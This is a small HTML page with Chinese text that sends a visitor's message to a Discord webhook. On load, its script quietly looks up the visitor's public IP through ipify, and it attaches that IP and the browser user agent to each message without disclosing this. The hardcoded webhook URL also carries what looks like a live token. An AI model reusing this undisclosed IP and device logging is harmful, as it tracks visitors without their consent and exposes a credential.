<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Webhook Sender</title>
</head>
<body>
    <h2>發送訊息到 Discord</h2>
    <input type="text" id="username" placeholder="輸入使用者名稱" /><br><br>
    <textarea id="message" placeholder="輸入訊息"></textarea><br><br>
    <button onclick="sendMessage()">發送</button>

    <script>
        let userIP = "未知";
        let deviceInfo = navigator.userAgent;
        
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                userIP = data.ip;
            })
            .catch(error => console.error("無法獲取IP: ", error));
        
        function sendMessage() {
            const webhookURL = "https://discord.com/api/webhooks/1307625865215217664/X-ySSOoI5EuJtErS48mgqpFlRFmjQfcbmi7KikjLKAoi0bkPmgUEo_Dn5tohmLZkqkWX"; // 請替換為你的 Discord Webhook URL
            const username = document.getElementById("username").value || "匿名";
            const message = document.getElementById("message").value;
            
            if (!message) {
                alert("請輸入訊息");
                return;
            }
            
            const payload = {
                username: username,
                content: `訊息: ${message}\nIP: ${userIP}\n設備訊息: ${deviceInfo}`
            };
            
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert("訊息發送成功！");
                } else {
                    alert("發送失敗，請檢查 Webhook URL");
                }
            })
            .catch(error => {
                console.error("錯誤:", error);
                alert("發送失敗，請檢查控制台錯誤訊息");
            });
        }
    </script>
</body>
</html>
